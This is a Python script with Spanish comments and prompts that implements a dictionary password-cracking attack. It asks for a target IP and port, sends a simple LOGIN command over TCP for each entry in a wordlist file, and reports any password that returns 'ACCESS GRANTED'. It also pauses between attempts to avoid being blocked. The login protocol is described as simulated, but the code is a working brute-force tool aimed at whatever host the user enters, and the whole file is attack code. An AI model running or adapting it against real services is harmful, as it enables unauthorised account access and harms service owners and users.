import socket
import time
import sys

# ===============================================
# CONFIGURACIÓN INICIAL
# ===============================================

# La lista de palabras (diccionario) que usaremos
WORDLIST_PATH = "passwords.txt"

# Comando o respuesta esperada tras un login exitoso.
# Aquí simulamos un servicio simple que responde "ACCESS GRANTED" si la contraseña es correcta.
SUCCESS_RESPONSE = "ACCESS GRANTED"

# ===============================================
# FUNCIÓN DE FUERZA BRUTA
# ===============================================

def run_brute_force():
    print("--- CRACKEADOR DE CONTRASEÑAS POR FUERZA BRUTA/DICCIONARIO ---")
    
    # 1. Pedir la configuración de destino
    target_ip = input("Introduce la IP de destino (Ej: 10.0.0.1): ")
    try:
        target_port = int(input("Introduce el Puerto de destino (Ej: 21 para FTP): "))
    except ValueError:
        print("[ERROR] El puerto debe ser un número entero.")
        return

    # 2. Verificar si la wordlist existe
    if not os.path.exists(WORDLIST_PATH):
        print(f"[ERROR] Archivo de wordlist no encontrado en la ruta: {WORDLIST_PATH}")
        print("Crea un archivo llamado 'passwords.txt' y añade contraseñas.")
        return

    print(f"\n[!] Iniciando ataque por diccionario en {target_ip}:{target_port}...")

    # 3. Abrir la wordlist y empezar el ataque
    with open(WORDLIST_PATH, 'r') as wordlist:
        for line in wordlist:
            password = line.strip() # Elimina espacios y saltos de línea
            
            # Simulamos el comando de login del protocolo
            login_command = f"LOGIN user {password}\r\n"
            
            print(f"[>] Probando: {password}")
            
            try:
                # 4. Crear y conectar el socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, target_port))
                
                # 5. Enviar el comando de login simulado
                s.send(login_command.encode())
                
                # 6. Recibir la respuesta del servidor
                response = s.recv(1024).decode('utf-8', 'ignore').strip()
                s.close()
                
                # 7. Verificar el éxito
                if SUCCESS_RESPONSE in response:
                    print("\n" + "="*50)
                    print(f"[!!!] ¡CONTRASEÑA ENCONTRADA! -> {password}")
                    print("="*50)
                    return # Detener el ataque
                
                # Pausa para evitar bloquear el servicio por demasiados intentos
                time.sleep(0.5) 

            except ConnectionRefusedError:
                print("[ERROR] Conexión rechazada. El servicio puede estar caído o bloqueó la IP.")
                return 
            except socket.timeout:
                # El servidor no respondió a tiempo, pero el ataque debe continuar
                pass 
            except Exception as e:
                print(f"[ERROR] Ocurrió un error inesperado: {e}")
                return

    print("\n[FIN] Diccionario agotado. La contraseña no fue encontrada.")


if __name__ == "__main__":
    import os
    run_brute_force()